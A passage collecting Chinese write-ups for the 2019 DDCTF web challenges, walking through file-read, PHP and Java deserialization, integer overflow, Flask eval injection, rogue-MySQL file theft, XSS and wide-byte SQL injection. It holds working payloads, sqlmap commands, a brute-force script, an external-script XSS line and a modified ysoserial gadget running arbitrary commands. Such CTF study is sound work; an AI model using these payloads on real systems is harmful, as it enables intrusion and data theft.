# 2019DDCTF滴滴高校闯关赛
本题已开通评论，欢迎在页面最下方留言吐槽。<img src="https://ctfwp.wetolink.com/alu/呲牙.png" alt="呲牙.png" class="vemoticon-img">
## 题目类型：
|类型|年份|难度|
|:---:|:---:|:---:|
|官方赛事题|2019|中|

# 题目下载：
+ 链接: https://pan.baidu.com/s/16CV9YL5maNYIi-TbXzMWHg 提取码: tdbs

# 网上公开WP：

+ https://mp.weixin.qq.com/s/eYCP2L6kK0mpg8CURIJajQ
+ https://mp.weixin.qq.com/s/af5KMZ5AZ4Xk8jJanGu4mQ
+ https://mp.weixin.qq.com/s/zFcVYOE383kheD08j21PBg
+ https://mp.weixin.qq.com/s/cRQQ-3-V-E-I22G_uJRZgw
+ https://mp.weixin.qq.com/s/NmgVHSMxIAh0iSOe5fdWgQ
+ https://xz.aliyun.com/t/4862
+ https://xz.aliyun.com/t/4849
+ https://github.com/neverlovelynn/DDCTF-2019-web-mysql-write-up
+ https://mp.weixin.qq.com/s?__biz=MzA3Mzk1MDk1NA==&mid=2651905380&idx=1&sn=2d85c96fe650fb625b53fbf8536ee0f5&chksm=84e34ee1b394c7f7d6d9302d5ebe0be50b1444b02a3b7f250f3898040618a9525532ba23f854&mpshare=1&scene=23&srcid=#rd
+ http://cdusec.happyhacking.top/?post=49
+ https://www.zhaoj.in/read-5269.html
+ http://12end.xyz/ddctf-writeup/
+ http://yuufeng.com/
+ https://blog.csdn.net/m0_37809075/article/details/89280350
+ https://www.xmsec.cc/p/4891b1d2-1166-4553-951c-d46cbac95af3/
+ http://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485730&idx=1&sn=cb90f178c56453f558acc626ec84ddad&chksm=e89e21fadfe9a8ecca8ac397984045c7ebda97577ac082d94141d37d0b12d70222128f0af2e7&mpshare=1&scene=23&srcid=#rd

# 本站备份WP：
**感谢作者：evoA、5am3、Glzjin、12end、admin-琴里、Yunen**

## WEB
### 滴~
本题作者：**Yunen**  

题目地址：http://117.51.150.246/  
打开题目：发现页面进行了一次调整，跳转后的url：  
http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09  
猜测jpg参数的值为base64编码后的内容，解码内容如下：  
`NjY2QzYxNjcyRTZBNzA2Nw==`  
明显的base64编码，再进行一次解码：  
`666C61672E6A7067`  
观察数据，发现两两一组时，字母全在数字后，且范围在[A-F]之内，猜测为HEX，将其转换为Ascii试试：  
`flag.jpg`  
明显的任意文件读取漏洞，尝试读取index.php    
将`index.php`其转换成HEX，再两次转Base64得：  
`TmprMlpUWTBOalUzT0RKbE56QTJPRGN3`  
替换原来的jpg值访问：  
![](https://ctfwp.wetolink.com/2019ddctf/0.png)  
红框部分即为index.php的base64编码过的内容，复制下来解码得：  
```
<?php
/*
 * https://blog.csdn.net/FengBanLiuYun/article/details/80616607
 * Date: July 4,2018
 */
error_reporting(E_ALL || ~E_NOTICE);


header('content-type:text/html;charset=utf-8');
if(! isset($_GET['jpg']))
    header('Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09');
$file = hex2bin(base64_decode(base64_decode($_GET['jpg'])));
echo '<title>'.$_GET['jpg'].'</title>';
$file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);
echo $file.'</br>';
$file = str_replace("config","!", $file);
echo $file.'</br>';
$txt = base64_encode(file_get_contents($file));

echo "<img src='data:image/gif;base64,".$txt."'></img>";
/*
 * Can you find the flag file?
 *
 */

?>
```

题目提示了一个url，还有一个日期(2018-7-4)。
打开提示文章，发现该文章发表时间与提示时间不同。  
![](https://ctfwp.wetolink.com/2019ddctf/1.png)  
打开作者首页，找到2018-7-4发表的文章：  
https://blog.csdn.net/FengBanLiuYun/article/details/80913909  
这里有个巨大脑洞！！写这题的时候真想杀了出题人<img src="https://ctfwp.wetolink.com/alu/中刀.png" alt="中刀.png" class="vemoticon-img">  
![](https://ctfwp.wetolink.com/2019ddctf/2.png)  
猜测存在备份文件`practice.txt.swp`，访问之~:  
![](https://ctfwp.wetolink.com/2019ddctf/3.png)  
提示flag存在于`f1ag!ddctf.php`文件，使用index.php读取之~  
由于`$file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);`，我们无法直接输入!  
不过由于`$file = str_replace("config","!", $file);`，我们可以使用config来代替。  
故payload为:  
`117.51.150.246/index.php?jpg=TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==`  
返回内容base64解码：  
```
<?php
include('config.php');
$k = 'hello';
extract($_GET);
if(isset($uid))
{
    $content=trim(file_get_contents($k));
    if($uid==$content)
	{
		echo $flag;
	}
	else
	{
		echo'hello';
	}
}
?>
```
简单的变量覆盖题，`extract($_GET);`会将GET内容转换成变量。  
`file_get_contents($k)`使用php://input将会返回post的数据  
getflag:  
![](https://ctfwp.wetolink.com/2019ddctf/4.png)  
flag: `DDCTF{436f6e6772617******174696f6e73}`
### Web签到题
打开题目，提示不是管理员权限，观察请求header，发现字段：didictf_username的值为空  
![](https://ctfwp.wetolink.com/2019ddctf/5.png)  
burp拦截数据包修改为admin，返回内容：  
`您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php`  
访问app/fL2XID2i0Cdh.php得源码：

url:app/Application.php
```
Class Application {
    var $path = '';


    public function response($data, $errMsg = 'success') {
        $ret = ['errMsg' => $errMsg,
            'data' => $data];
        $ret = json_encode($ret);
        header('Content-type: application/json');
        echo $ret;

    }

    public function auth() {
        $DIDICTF_ADMIN = 'admin';
        if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) && $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) {
            $this->response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php');
            return TRUE;
        }else{
            $this->response('抱歉，您没有登陆权限，请获取权限后访问-----','error');
            exit();
        }

    }
    private function sanitizepath($path) {
    $path = trim($path);
    $path=str_replace('../','',$path);
    $path=str_replace('..\\','',$path);
    return $path;
}

public function __destruct() {
    if(empty($this->path)) {
        exit();
    }else{
        $path = $this->sanitizepath($this->path);
        if(strlen($path) !== 18) {
            exit();
        }
        $this->response($data=file_get_contents($path),'Congratulations');
    }
    exit();
}
}

```
url:app/Session.php

```
include 'Application.php';
class Session extends Application {

    //key建议为8位字符串
    var $eancrykey                  = '';
    var $cookie_expiration			= 7200;
    var $cookie_name                = 'ddctf_id';
    var $cookie_path				= '';
    var $cookie_domain				= '';
    var $cookie_secure				= FALSE;
    var $activity                   = "DiDiCTF";


    public function index()
    {
	if(parent::auth()) {
            $this->get_key();
            if($this->session_read()) {
                $data = 'DiDI Welcome you %s';
                $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']);
                parent::response($data,'sucess');
            }else{
                $this->session_create();
                $data = 'DiDI Welcome you';
                parent::response($data,'sucess');
            }
        }

    }

    private function get_key() {
        //eancrykey  and flag under the folder
        $this->eancrykey =  file_get_contents('../config/key.txt');
    }

    public function session_read() {
        if(empty($_COOKIE)) {
        return FALSE;
        }

        $session = $_COOKIE[$this->cookie_name];
        if(!isset($session)) {
            parent::response("session not found",'error');
            return FALSE;
        }
        $hash = substr($session,strlen($session)-32);
        $session = substr($session,0,strlen($session)-32);

        if($hash !== md5($this->eancrykey.$session)) {
            parent::response("the cookie data not match",'error');
            return FALSE;
        }
        $session = unserialize($session);


        if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent'])){
            return FALSE;
        }

        if(!empty($_POST["nickname"])) {
            $arr = array($_POST["nickname"],$this->eancrykey);
            $data = "Welcome my friend %s";
            foreach ($arr as $k => $v) {
                $data = sprintf($data,$v);
            }
            parent::response($data,"Welcome");
        }

        if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) {
            parent::response('the ip addree not match'.'error');
            return FALSE;
        }
        if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) {
            parent::response('the user agent not match','error');
            return FALSE;
        }
        return TRUE;

    }

    private function session_create() {
        $sessionid = '';
        while(strlen($sessionid) < 32) {
            $sessionid .= mt_rand(0,mt_getrandmax());
        }

        $userdata = array(
            'session_id' => md5(uniqid($sessionid,TRUE)),
            'ip_address' => $_SERVER['REMOTE_ADDR'],
            'user_agent' => $_SERVER['HTTP_USER_AGENT'],
            'user_data' => '',
        );

        $cookiedata = serialize($userdata);
        $cookiedata = $cookiedata.md5($this->eancrykey.$cookiedata);
        $expire = $this->cookie_expiration + time();
        setcookie(
            $this->cookie_name,
            $cookiedata,
            $expire,
            $this->cookie_path,
            $this->cookie_domain,
            $this->cookie_secure
            );

    }
}


$ddctf = new Session();
$ddctf->index();
```
这里我才有回溯的方法，先确定flag可能的输出点在构造满足条件的payload。  
在`private function get_key()`函数里提示到flag与eanccrykey在同一个文件夹，猜测flag内容在`../config/flag.txt`里。  
通读代码，可以发现唯一可能的flag输出点在`public function __destruct()`，这是Application类的析构函数，退出时会自动执行里边的代码，结合下边的serialize与unserialize易知此题考的是php反序列化。  
而我们发现，如果我们直接对cookie进行修改是不行，这是因为服务端使用key进行了加密验证处理，如果我们能拿到key的内容，那么变可以轻易绕过。  
```
        if(!empty($_POST["nickname"])) {
            $arr = array($_POST["nickname"],$this->eancrykey);
            $data = "Welcome my friend %s";
            foreach ($arr as $k => $v) {
                $data = sprintf($data,$v);
            }
            parent::response($data,"Welcome");
        }
```
我们注意到此处函数涉及到key值的操作，其中sprintf为占位符替换函数。  
如果我们post的nickname值里存在%s 那么key值也会随着输出。  
先获得cookie值，记得header头加上`didictf_username: admin`  
![](https://ctfwp.wetolink.com/2019ddctf/6.png)  
将cookie替换，post内容:`nickname=a---%s`  
得到key:`EzblrbNS`，至此大工告成。  
![](https://ctfwp.wetolink.com/2019ddctf/7.png)  
理清下思路：  
+ 1.新建Application类，修改path变量为`..././config/flag.txt`(../进行过一次过滤)  
+ 2.将类加入$userdata数组进行序列化处理
+ 3.返回key加密后的cookie
+ 4.getflag

本地搭建php环境：
将以下源码复制访问 即可生成序列化数据：
```
<?
Class Application {
    var $path = '';


    public function response($data, $errMsg = 'success') {
        $ret = ['errMsg' => $errMsg,
            'data' => $data];
        $ret = json_encode($ret);
        header('Content-type: application/json');
        echo $ret;

    }

    public function auth() {
        return true;

    }
    private function sanitizepath($path) {
    $path = trim($path);
    $path=str_replace('../','',$path); 
    $path=str_replace('..\\','',$path);
    return $path;
}

public function __destruct() {
	$this->response($this->user_agent);
    if(empty($this->path)) {
		$this->response("error111");
        exit();
    }else{
        $path = $this->sanitizepath($this->path);
        if(strlen($path) !== 18) {
            exit();
        }
        $this->response($data=file_get_contents($path),'Congratulations');
    }
    exit();
}
}

class Session extends Application {

    //key建议为8位字符串
    var $eancrykey                  = '';
    var $cookie_expiration			= 7200;
    var $cookie_name                = 'ddctf_id';
    var $cookie_path				= '';
    var $cookie_domain				= '';
    var $cookie_secure				= FALSE;
    var $activity                   = "DiDiCTF";


    public function index()
    {
	if(parent::auth()) {
            $this->get_key();
            if($this->session_read()) {
                $data = 'DiDI Welcome you %s';
                $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']);
                parent::response($data,'sucess');
            }else{
                $this->session_create();
                $data = 'DiDI Welcome you';
                parent::response($data,'sucess');
            }
        }

    }

    private function get_key() {
        //eancrykey  and flag under the folder
        $this->eancrykey =  'EzblrbNS';
    }

    public function session_read() {
        if(empty($_COOKIE)) {
        return FALSE;
        }

        $session = $_COOKIE[$this->cookie_name];
        if(!isset($session)) {
            parent::response("session not found",'error');
            return FALSE;
        }
        $hash = substr($session,strlen($session)-32);
        $session = substr($session,0,strlen($session)-32);

        if($hash !== md5($this->eancrykey.$session)) {
            parent::response("the cookie data not match",'error');
            return FALSE;
        }
        $session = unserialize($session);


        if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent'])){
            return FALSE;
        }

        if(!empty($_POST["nickname"])) {
            $arr = array($_POST["nickname"],$this->eancrykey);
            $data = "Welcome my friend %s";
            foreach ($arr as $k => $v) {
                $data = sprintf($data,$v);
            }
            parent::response($data,"Welcome");
        }

        if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) {
            return true;
        }
        if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) {
            parent::response('the user agent not match','error');
            return FALSE;
        }
        return TRUE;

    }

    private function session_create() {
        $sessionid = '';
        while(strlen($sessionid) < 32) {
            $sessionid .= mt_rand(0,mt_getrandmax());
        }

		$a = new Application;  //新建Application类
		$a->path = '..././config/flag.txt';  //修改类中变量path

        $userdata = array(
			$a,  //序列化
            'session_id' => md5(uniqid($sessionid,TRUE)),
            'ip_address' => $_SERVER['REMOTE_ADDR'],
            'user_agent' => $_SERVER['HTTP_USER_AGENT'],
            'user_data' => '',
        );

        $cookiedata = serialize($userdata);
		parent::response($cookiedata);
        $cookiedata = $cookiedata.md5($this->eancrykey.$cookiedata);
        $expire = $this->cookie_expiration + time();
        setcookie(
            $this->cookie_name,
            $cookiedata,
            $expire,
            $this->cookie_path,
            $this->cookie_domain,
            $this->cookie_secure
            );

    }
}

$ddctf = new Session();
$ddctf->index();?>
```
生成数据：
```
a:5:{i:0;O:11:"Application":1:{s:4:"path";s:21:"..././config/flag.txt";}s:10:"session_id";s:32:"d31fd78332ef2737d3c007915d643d86";s:10:"ip_address";s:13:"192.168.246.1";s:10:"user_agent";s:115:"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36";s:9:"user_data";s:0:"";}
```
注意此处的数据由于UA头不同，请自己生成。  
记得加上key进行md5加密：  
```python
import hashlib
str = 'EzblrbNS'+'a:5:{i:0;O:11:"Application":1:{s:4:"path";s:21:"..././config/flag.txt";}s:10:"session_id";s:32:"d31fd78332ef2737d3c007915d643d86";s:10:"ip_address";s:13:"192.168.246.1";s:10:"user_agent";s:115:"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36";s:9:"user_data";s:0:"";}'
print(hashlib.md5(str.encode('utf8')).hexdigest())
```
得到hash:`3c27da16d59c7edbacbf41a5cea391c3`  
修改数据包重放：  
![](https://ctfwp.wetolink.com/2019ddctf/8.png)  
记得先url编码哟~  
flag: `DCTF{ddctf2019_*****_pHVlHIDDGdV8qA2j}`

### UploadIMG
作者：**Glzjin**  

>知识点：PHP-GD 二次渲染绕过

步骤：
1、用上面给出的用户名密码打开靶机，发现是这么一个页面。  
![](https://ctfwp.wetolink.com/2019ddctf/9.png)  
2、那么就传一个图片上去试试吧。  
![](https://ctfwp.wetolink.com/2019ddctf/10.png)  
3、上传之后，发现提示 “[Check Error]上传的图片源代码中未包含指定字符串:phpinfo()”，并且还返回了上传之后图片的地址。  
![](https://ctfwp.wetolink.com/2019ddctf/11.png)  
![](https://ctfwp.wetolink.com/2019ddctf/12.png)  
4、那么我们就把我们上传之后的图片下载回来看看吧。下载之后用 hex 编辑器打开。发现开头这儿指明了其是 php-gd 带着 libjpeg 转换的。  
![](https://ctfwp.wetolink.com/2019ddctf/13.png)  
5、比较一下原图片和现在的图片，似乎有很多不同。  
![](https://ctfwp.wetolink.com/2019ddctf/14.png)  
6、那么我们把下载下来的图片再传回去呢？  
![](https://ctfwp.wetolink.com/2019ddctf/15.png)  
7、啊哈，这一把前面倒是蛮多相同的地方了。  
![](https://ctfwp.wetolink.com/2019ddctf/16.png)  
8、那么我们就往里面相同的部分替换 “phpinfo()” (9字节)试试。  
![](https://ctfwp.wetolink.com/2019ddctf/17.png)  
![](https://ctfwp.wetolink.com/2019ddctf/18.png)  
9、不断 fuzz 插入的位置，发现插入这里可以。  
![](https://ctfwp.wetolink.com/2019ddctf/19.png)  
![](https://ctfwp.wetolink.com/2019ddctf/20.png)  
10、Flag 到手~

### 大吉大利，今晚吃鸡~
本文作者：**12end**  
进去注册，登录后只有100金币，但是吃鸡的ticket需要2000金币，需要想办法绕过去。  
#### 购买ticket  
截取添加订单的请求，发现是一个简单的get请求，且ticket_price是可控的：  
![](http://imgs.12end.xyz/ctf/ddctf2019/5.png)  
经尝试发现，这个tickiet_price只可以修改地比2000大，且只能含有数字，那么我们只能考虑整数溢出了。  
在32位系统下，所有无符号整数的数量是2^32=4294967296，去掉0这个数的话，最大整数便是4294967295，当我们令一个数等于2^32时，它便会溢出为0。  
我们这里传入4294967297,虽然订单页面显示的还是如此，但实际支付订单时，它才产生了溢出，初步认为他是以字符串存入，在运算时再转换为整型（可能并不准确），最后只花了1金币购买：  
![](http://imgs.12end.xyz/ctf/ddctf2019/6.png)  
进到游戏之后，可以通过提交正确id与ticket来移除对手，没什么好办法，经过一番尝试了解到id与ticket是固定对应的关系，只有写脚本通过暴力注册获取尽可能多的id，然后一一删除了。  

tips:  
剩余对手的100人中，id是任意的，你并不能保证只需要注册100次就可以删掉全部的对手，最有效的办法是注册一次删除一次。  

因篇幅原因，抓取api请求，并编写脚本的过程便不再赘述，脚本注释已较为详尽，使用时修改参数即可，唯一缺憾是代码健壮性欠佳，遇到网络问题时不能处理错误造成崩溃，但代码作用是可续的，所以问题不大，重启脚本就可以继续了  
```
import requests
import time

regist = "http://117.51.147.155:5050/ctf/api/register?password=11111111&name="#name添加一个前缀
buy_ticket = "http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296"
pay_ticket = "http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id="
delete = "http://117.51.147.155:5050/ctf/api/remove_robot"
get_flag="http://117.51.147.155:5050/ctf/api/get_flag"

i= 55555                                                       #初始化用户名,使用未注册过的数字

def delete_robot(player_id, player_ticket):
    COOKIE = {"Cookie": "user_name=; REVEL_SESSION="}               #修改为自己主账户的cookie
    param={"id":player_id,"ticket":player_ticket}
    requests.get(delete,params=param, headers=COOKIE)               #删除id
    flag = requests.get(get_flag, headers=COOKIE)                   #获取剩余的敌人数量
    print(flag.text )

while True:
    t = requests.session()
    i+=1
    r = t.get(regist + str(i))                      #注册
    r = t.get(buy_ticket).json()                    #购买Ticket，解析json
    bill_id = r["data"][0]["bill_id"]               #json解析bill_id
    r = t.get(pay_ticket + bill_id).json()          #支付订单
    player_id = r["data"][0]["your_id"]
    player_ticket = r["data"][0]["your_ticket"]     #json解析id与ticket
    delete_robot(player_id,player_ticket)           #使用主账户删除id
    time.sleep(0.3)                                 #短暂休眠避免被封
```

### homebrew event loop
作者：**12end**  
直接审计源码    
对于本题的字串切割函数get_mid_str请自行理解，如果不明白这个函数的话，下面的payload将难以理解原理。  
首先，eval的那部分由于分割不当可以通过注释符导致代码执行，我们可以构造?action:show_flag_function%23;请求来执行一个（没卵用的函数）:  
![](http://imgs.12end.xyz/ctf/ddctf2019/7.png)  
能够执行，就该思考怎么进一步利用以获取flag  
不难看出，本题靠队列控制函数的执行流程，且唯一获取flag的函数被ban掉了返回值:  
```
def show_flag_function(args):               #被ban的输出flag函数，没有return flag
    flag = args[0]
    #return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.
    return 'You naughty boy! ;) <br />'
```
仔细观察代码，我们发现还可以从两个地方获取flag：  
+ 1.直接执行FLAG()
+ 2.执行get_flag_handler会通过trigger_event('func:show_flag;' + FLAG())将flag的值入队

我最开始想到的方法便是直接执行FLAG()，在flask中，视图函数的返回值会被传输到前端以供展示，这道题的视图函数entry_point的返回值是execute_event_loop(),而execute_event_loop的返回值resp是由事件循环中执行函数的返回值ret_val决定的，这也就是我们直接执行show_flag_function函数会将返回值打印在前端的原因。以此推出，如果能直接执行FLAG()，flag也会被打印出来。到此为止似乎一帆风顺，我们把上面的请求稍作修改不就可以拿flag了吗？实际测试却404了。  

404的原因在这里：  
```
try:
    event_handler = eval(action + ('_handler' if is_action else '_function'))       #eval造成的代码执行，从这里下手
    ret_val = event_handler(args)                                       #获取返回值
```
可以看到第三行的执行函数是带有参数的，而我们试图向一个不需要参数的函数传参时，python会抛出参数过多的错误，try失败后就会导致404。  
思考了很久也没有想出能够绕过这里的地方，如果绕过去了，这应当是一个非预期解。  

经@Smi1e师傅的指导，知道这道题要利用flask的客户端session导致的安全问题。  
相关文章：[客户端 session 导致的安全问题](https://www.leavesongs.com/PENETRATION/client-session-security.html)  
好巧不巧，题中的执行队列恰巧是存储在session中的。  
那么，我们只需要利用上面提到的第二点来将flag值入队，解密此时的session即可。  
payload:`?action:trigger_event%23;action:buy;5%23action:get_flag;`  

### mysql弱口令
作者：**12end**  
提示先部署agent.py再进行弱口令扫描
在agent.py的响应函数中，返回了`result`的响应内容，`result`的值来源于`_func`函数：
```
class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        ....
        ...
        result = self._func()
        self.wfile.write(json.dumps(result))
研究一下_func()：

def _func(self):
    netstat = Popen(['netstat', '-tlnp'], stdout=PIPE)  //执行netstat子进程，获取在监听的tcp服务程序名等信息并输入至pipe
    netstat.wait()              //等待子进程结束

    ps_list = netstat.stdout.readlines()        //逐行读取
    result = []
    for item in ps_list[2:]:
        tmp = item.split()
        Local_Address = tmp[3]
        Process_name = tmp[6]
        tmp_dic = {
            'local_address': Local_Address,
            'Process_name': Process_name
        }
        result.append(tmp_dic)  //向result中增加字典元素，包含着进程的源地址及进程名称
    return result
```
可以看出整个程序的作用就是返回tcp服务进程的相关信息，猜测题目的服务器（下称靶机）是以此判断mysql是否在目标服务器（下称客户机）上运行。  

尝试一番，当我们未在客户机上运行agent.py时，会提示：  

![](http://imgs.12end.xyz/ctf/ddctf2019/8.png)  

而此时，我们客户机的Mysql是开启着的。  

同样，将客户机的Mysql关闭，agent.py运行，会提示未扫描到弱密码。mysql的进程名称是mysqld，我们直接修改`self.wfile.write(json.dumps(result))`为mysqld可以成功绕过服务器的判断。  

绕过了，然后呢？  
祭出我@Smi1e师傅的一篇blog：[MySQL LOAD DATA 读取客户端任意文件](https://www.smi1e.top/mysql-load-data-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/)  
>[如何利用MySQL LOCAL INFILE读取客户端文件](https://www.anquanke.com/post/id/106488)

大意是指,主机A连接远程mysql服务器主机B的过程中，所有请求都是明文传输，而我们可以在主机B上伪造任意内容发送给主机A。
而在MySQL中，LOAD DATA LOCAL INFLIE语句会将本地内容传输给远端服务器，下面是执行LOAD DATA LOCAT INFILE的过程：  

`本地向远端服务器发起请求包，请求包含要传输的文件路径`->
`远端服务器对请求进行响应，响应内容为请求包中的文件路径`->
`本地发送响应包中的文件内容`  

如果我们可以伪造响应的任意内容，也就意味着能够读取到连接者本地的任意文件

>最重要的是伪造的服务端可以在任何时候回复一个file-transfer 请求，不一定非要是在客户端发送LOAD DATA LOCAL数据包的时候。（前提是客户端已经请求了任意内容，幸运的时，绝大多数客户端都会在连接mysql成功时发送一系列类似@@version的初始化请求）
不过如果想要利用此特性，客户端必须具有CLIENT_LOCAL_FILES即(Can use LOAD DATA LOCAL)属性。如果没有的话，就要在连接mysql的时候加上--enable-local-infile。  

回归正题，为了与靶机建立连接，我们就需要让靶机认为已经连接上了我们的数据库，我们只需向其响应greeting以及authok的数据包即可，然后再发送精心构造好的数据包，让靶机把我们想要的文件给响应过来  
在github上已有相关的项目以部署这样的恶意mysql服务器：[Rogue-MySql-Server](https://github.com/allyshka/Rogue-MySql-Server)   
在这里以python的脚本为例：  

修改26行的filelist为我们想要读取的文件路径，假设为’/etc/passwd’，先开启agent.py欺骗靶机，告诉它我们已经开启了mysqld进程，再开启这个poc.py，然后让靶机扫描一下我们的客户机：  
![](http://imgs.12end.xyz/ctf/ddctf2019/9.png)
最后的文件信息会在当前目录下的mysql.log：  
![](http://imgs.12end.xyz/ctf/ddctf2019/10.png)  
root用户的mysql操作一般记录在：`~/.mysql_history`中，读取一下就可以拿到flag

### 欢迎报名DDCTF
作者：**evoA**  
太脑洞了，太脑洞了，太脑洞了  
一直以为是sql，直到用xss的exp发现有bot请求  
在报名页面的备注里只对sql进行一点过滤，但是xss没有任何过滤，直接`<script src=//xxxx></script>`即可  
通过xss平台读页面源码读到一个接口  
![](https://ctfwp.wetolink.com/2019ddctf/27.png)  
`http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=`
测了半天注入还是没东西，结果一堆人做出来后重新复测，注意到返回头GBK  
![](https://ctfwp.wetolink.com/2019ddctf/28.png)  
然后就是宽字节注入  
SQLmap加tamper都可以跑  
```
#所有数据库名  
python2 sqlmap.py -u "http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1" --tamper unmagicquotes --dbs --hex

#数据库表名  
python2 sqlmap.py -u "http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1" --tamper unmagicquotes --hex -D "ctfdb" --tables

#字段名  
python2 sqlmap.py -u "http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1" --tamper unmagicquotes --hex -D "ctfdb" -T "ctf_fhmHRPL5" --columns

#flag  
python2 sqlmap.py -u "http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1" --tamper unmagicquotes --hex --sql-shell
sql-shell> select ctf_value from ctfdb.ctf_fhmHRPL5;
```
常规操作，注库名，表名，字段名（TCL）做的时候想的太复杂了，但是我的sqlmap最后这里不能直接--dump，所以我执行了--sql-shell自定义sql命令最终拿的flag  
sqlmap宽字节注入自带的tamper是`unmagicquotes`  
这里因为过滤了单引号，所以我们需要用--hex参数将字符串转为0x开头的16进制数字避开引号  
![](https://ctfwp.wetolink.com/2019ddctf/29.png)

### 再来1杯Java
作者：**5am3**  
p.s.压轴题哈，说实话，这题真的学会了不少东西。毕竟自己太菜了，虽然本科专业为java开发狗。但我真的不太熟啊...  
一共分为三关吧。  
+ 首先是一个PadOracle攻击，伪造cookie。这个解密Cookie可以看到hint： PadOracle:iv/cbc。  
+ 第二关，读文件，看到后端代码后，才发现，这里贼坑。  
+ 第三关，反序列化。  

首先第一关好说，其实在/api/account_info这个接口，就可以拿到返回的明文信息。然后通过Padding Oracle + cbc翻转来伪造cookie即可。在这里就不多说了。网上很多资料。
最后拿到cookie，直接浏览器写入cookie就OK。然后可以获取到一个下载文件的接口。
>/api/fileDownload?fileName=1.txt

虽然说是一个任意文件读取的接口，但是贼坑、  
一顿操作猛如虎，最后只读出/etc/passwd...  

搜到了[很多字典](https://github.com/tdifg/payloads/blob/master/lfi.txt)。然后burp爆破一波，最后发现/proc/self/fd/15这里有东西，看到熟悉的pk头，情不自禁的笑了起来。（对，就是源码）  
![](https://ctfwp.wetolink.com/2019ddctf/30.png)  
源码也不多，很容易，可以看到一个反序列化的接口。  
![](https://ctfwp.wetolink.com/2019ddctf/31.png)  
在反序列化之前，还调用了SerialKiller，作为一个waf，对常见payload进行拦截。  
首先题目给了hint：JRMP。根据这个hint，我们可以找到很多资料。在这里自己用的ysoserial，根据他的JRMP模块来进行下一步操作。  
在这里，JRMP主要起了一个绕过waf的功能，因为这个waf只在反序列化userinfo时进行了调用。当通过JRMP来读取payload进行反序列化时，不会走waf。  
首先，JRMP这个payload被waf掉了，我们可以采用先知上的一种绕过方式。  
>https://xz.aliyun.com/t/2479

![](https://ctfwp.wetolink.com/2019ddctf/32.png)  
直接修改ysoserial源码即可，将原有的JRMPClient的payload复制一份，改名为JRMPClient2，然后保存并编译。  
此时我们可以尝试使用URLDNS模块，来判断是否攻击成功。  
修改替换{\{内容}}  
开启监听端口  
建议采用ceye的dnslog查看  
`java -cp ./ysoserial-5am3.jar ysoserial.exploit.JRMPListener {\{port}} URLDNS {\{http://eval.com}}`  
生成链接JRMPListener的payload  
ip端口那里填写运行第4行脚本的主机地址端口  
`java -jar ./ysoserial-5am3.jar JRMPClient2 {\{10.0.0.1:8119}} | base64`  
此时将第10行生成的代码，直接打到远程即可。  
然后查看dnslog信息。发现存在，那就是ok了。  
接下来可以尝试换payload了。此时这里还存在一个问题。服务器端无法执行命令！！  
这个是hint中给的，所以我们需要找另一种方式，如：代码执行。  
查阅资料，发现ysoserial预留了这块的接口，修改即可。  
>https://blog.csdn.net/fnmsd/article/details/79534877

然后我们尝试去修改ysoserial/payloads/util/Gadgets.java中createTemplatesImpl方法如下：  
```
// createTemplatesImpl修改版，支持代码执行
public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
            throws Exception {
        final T templates = tplClass.newInstance();

        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
        // run command in static initializer
        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
//        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
//            command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
//            "\");";
        String cmd="";
        //如果以code:开头，认为是代码，否则认为是命令
        if(!command.startsWith("code:")){
            cmd = "java.lang.Runtime.getRuntime().exec(\"" +
            command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
            "\");";
        }
        else{
            System.err.println("Java Code Mode:"+command.substring(5));//使用stderr输出，防止影响payload的输出
            cmd = command.substring(5);
        }
        clazz.makeClassInitializer().insertAfter(cmd);
        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
